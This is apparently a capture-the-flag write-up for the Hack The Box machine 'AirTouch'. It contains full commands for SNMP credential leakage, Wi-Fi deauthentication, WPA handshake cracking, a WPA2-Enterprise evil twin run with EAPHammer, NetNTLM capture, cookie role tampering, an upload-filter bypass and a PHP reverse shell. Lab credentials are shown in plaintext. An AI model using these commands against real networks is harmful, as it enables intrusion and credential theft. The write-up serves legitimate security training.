# AirTouch - Hack The Box Writeup
**Category:** Linux  
**Difficulty:** Medium 

## Enumeration

### TCP Scan

Running an Nmap scan on the target revealed only SSH running over TCP.

```text
22/tcp open  ssh  OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
```

### UDP Scan

A UDP scan revealed SNMP:

```text
161/udp open snmp
```

Port **161** is used by **SNMP (Simple Network Management Protocol)**, which is commonly used for monitoring IP networks, collecting device information, and sometimes even remotely configuring devices.

---

## SNMP Enumeration

Using `snmp-check`:

```bash
snmp-check 10.129.11.112
```

Output:

```text
[*] System information:

Host IP address : 10.129.11.112
Hostname        : Consultant
Description     : "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
Contact         : admin@AirTouch.htb
Location        : "Consultant pc"
```

The SNMP description leaks a password:

```text
RxBlZhLmOkacNWScmZ6D
```

---

## Initial Access

The contact field suggested the existence of an `admin` user.

Attempting SSH as admin failed:

```bash
ssh admin@AirTouch.htb
```

However, using the name mentioned in the description as the username worked:

```bash
ssh consultant@AirTouch.htb
```

Password:

```text
RxBlZhLmOkacNWScmZ6D
```

Successfully obtained a shell.

---

## Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: ALL
```

Escalation was trivial:

```bash
sudo su
```

Root access obtained.

---

## Initial Investigation

Inside `/root` I found an interesting directory:

```text
/root/eaphammer
```

EAPHammer is a toolkit used to perform targeted Evil Twin attacks against WPA2-Enterprise networks.

I also noticed:

```text
/root/eaphammer/db/phase2.accounts
```

but decided to come back to it later.

---

## Identifying the Environment

Checking listening services:

```bash
netstat -tulnp
```

Output:

```text
tcp        0      0 0.0.0.0:22
tcp        0      0 127.0.0.11:40323
udp        0      0 0.0.0.0:161
udp        0      0 127.0.0.11:58227
```

The presence of:

```text
127.0.0.11
```

is commonly associated with Docker's internal DNS service.

This suggested that I was operating inside a Docker container.

---

# Wireless Network Attack

The presence of EAPHammer strongly suggested that Wi-Fi attacks would be involved.

Since I appeared to be inside a Docker container, I wanted to verify whether wireless hardware was exposed.

Enable monitor mode:

```bash
airmon-ng start wlan0
```

Verify:

```bash
airodump-ng wlan0mon
```

It worked.

The container had access to a wireless adapter.

---

## Capturing a WPA Handshake

Start monitoring:

```bash
airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w airtouch_capture wlan0mon
```

In another terminal:

```bash
aireplay-ng --deauth 10 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0mon
```

This forced the client to reconnect.

After a few moments, a WPA handshake appeared in the top-right corner of the airodump window.

---

## Cracking the Handshake

Verify capture:

```bash
aircrack-ng airtouch_capture-02.cap
```

Crack using RockYou:

```bash
aircrack-ng -w rockyou.txt airtouch_capture-02.cap
```

Password recovered:

```text
challenge
```

---

## Connecting to AirTouch-Internet

Stop monitor mode:

```bash
airmon-ng stop wlan0mon
```

Generate configuration:

```bash
wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/wifi.conf
```

Connect:

```bash
wpa_supplicant -i wlan0 -c /tmp/wifi.conf -B
```

Obtain IP:

```bash
dhclient wlan0
```

Verify:

```bash
ifconfig
```

Connection successful.

---

# Internal Network Enumeration

Scanning the subnet revealed:

```text
192.168.3.1
```

Open ports:

```text
22/tcp open ssh
53/tcp open domain
80/tcp open http
```

---

## Port Forwarding

To access the internal web application more conveniently:

```bash
ssh consultant@AirTouch.htb -L 8080:192.168.3.1:80
```

This exposed the web application locally:

```text
http://localhost:8080
```

Nothing immediately useful was discovered.

---

# Router Compromise

I initially attempted a Karma Evil Twin attack using EAPHammer but got nowhere.

After a while of enumeration and research, I learned that the previously captured `.pcap` file might contain useful information.

When we capture packets with airodump-ng, we're capturing encrypted frames because:
The Wi-Fi network uses WPA2 encryption.
Each device has a unique temporal key (PTK) negotiated during the 4-way handshake.

I also found we can decrypt it using the Wifi password.
So i decrypted the airtouch.pcap file using:
```text
airdecap-ng -e "AirTouch-Internet" -p challenge "airtouch.pcap"
```

When I searched for HTTP traffic I found a session cookie.

The cookie contained:

```text
userrole=user
```

Changing it to:

```text
userrole=admin
```

granted administrator access.

---

## File Upload Bypass

An upload feature became available.

Uploading `.php` and `.html` files was blocked.

To intercept requests to our machine's own ports, we can simply use Burp's built-in browser.

Ironically, Burp wasn't even required.

The upload filter could be bypassed simply by renaming:

```text
shell.php
```

to:

```text
shell.phtml
```

The upload succeeded.

---

## Obtaining a Shell

I uploaded a PHP webshell.

A reverse shell directly to my Kali machine failed.

The reason was that the router was located on a different network and couldn't reach Kali.

Instead, I used PentestMonkey's PHP reverse shell and targeted the Consultant machine.

This worked successfully.

---

## Router User Access

Inside `login.php` I discovered credentials for:

```text
JunDRDZKHDnpkpDDvay
```

Using those credentials I SSH'd into the router.

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: ALL
```

Escalation:

```bash
sudo su
```

User flag obtained.

---

# Wireless Infrastructure Loot

Inside:

```text
/root/psk/hostapd
```

I found Wi-Fi configuration files and certificates.

A script named:

```text
send_certs.sh
```

contained another set of credentials:

```bash
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
```

The script copied files to:

```text
10.10.10.1
```

This appeared to be another machine.

Since we now possessed valid certificates, performing a WPA2-Enterprise Evil Twin attack became possible.

---

# Attacking AirTouch-Office

Locate the legitimate AP:

```bash
sudo airodump-ng -c 44 --essid "AirTouch-Office" wlan5mon
```

After identifying the BSSID, I observed multiple associated stations.

---

## Launching the Rogue AP

Start EAPHammer:

```bash
./eaphammer -i wlan4 --channel 44 --auth wpa-eap --essid "AirTouch-Office" --creds --karma
```

Deauthenticate a client:

```bash
sudo aireplay-ng --deauth 10 -a AC:8B:A9:AA:3F:D2 -c C8:8A:9A:6F:F9:D2 wlan1mon
```

The victim connected to my rogue access point.

---

## Capturing Credentials

EAPHammer captured:

```text
AirTouch\r4ulcl
```

NetNTLM hash:

```text
r4ulcl::::85702270f73c1ce40f7fbdd8380dfc0974469d696de72a6f:1cd6d6806c9fd5b6
```

Cracking the hash revealed:

```text
laboratory
```

This turned out to be the user's WPA2-Enterprise password.

---

## Connecting to AirTouch-Office

Using the captured credentials:

```bash
sudo wpa_supplicant -i wlan5 -c /dev/stdin << 'EOF'
ctrl_interface=/var/run/wpa_supplicant

network={
    ssid="AirTouch-Office"
    bssid=ac:8b:a9:aa:3f:d2
    key_mgmt=WPA-EAP
    eap=PEAP
    phase2="auth=MSCHAPV2"
    identity="AirTouch\r4ulcl"
    anonymous_identity="anonymous"
    password="laboratory"
    ca_cert="/root/eaphammer/certs-backup/ca.crt"
}
EOF
```

Connection successful.

Using the previously discovered credentials:

```text
remote : xGgWEwqUpfoOVsLeROeG
```

I SSH'd into the next machine.

---

# Final Privilege Escalation

After exhausting the techniques I knew, I checked running services:

```bash
service --status-all
```

Interesting result:

```text
hostapd
```

HostAPD (Host Access Point Daemon) is software that allows a Linux system to act as a wireless access point and authentication server.

Passwords are often stored inside:

```text
/etc/hostapd
```

Inspecting the directory revealed:

```text
hostapd_wpe.eap_user
```

Inside were credentials:

```text
admin:xMJpzXt4D9ouMuL3JJsMriF7KZozm7
```

In hindsight, LinPEAS had actually shown this file under:

```text
Executable files potentially added by user
```

I simply overlooked it.

---

## Root

Checking sudo:

```bash
sudo -l
```

Output:

```text
(ALL) ALL
(ALL) NOPASSWD: ALL
```

Escalation:

```bash
sudo su
```

Root access obtained.

Root flag captured.

---

# Lessons Learned

- SNMP descriptions can leak credentials.
- Docker containers may still expose physical wireless hardware.
- Capturing additional traffic after a WPA handshake can reveal valuable information.
- Cookie-based authorization is dangerous when not validated server-side.
- Upload filters frequently overlook extensions such as `.phtml`.
- WPA2-Enterprise environments become highly vulnerable when certificates and infrastructure files are exposed.
- Always review LinPEAS findings carefully, even entries that are not highlighted.

---

**Personal Opinion:** This machine was rated Medium, but the combination of wireless attacks, Evil Twin attacks, packet analysis, WPA2-Enterprise abuse, multiple pivots, and infrastructure enumeration made it feel significantly harder.
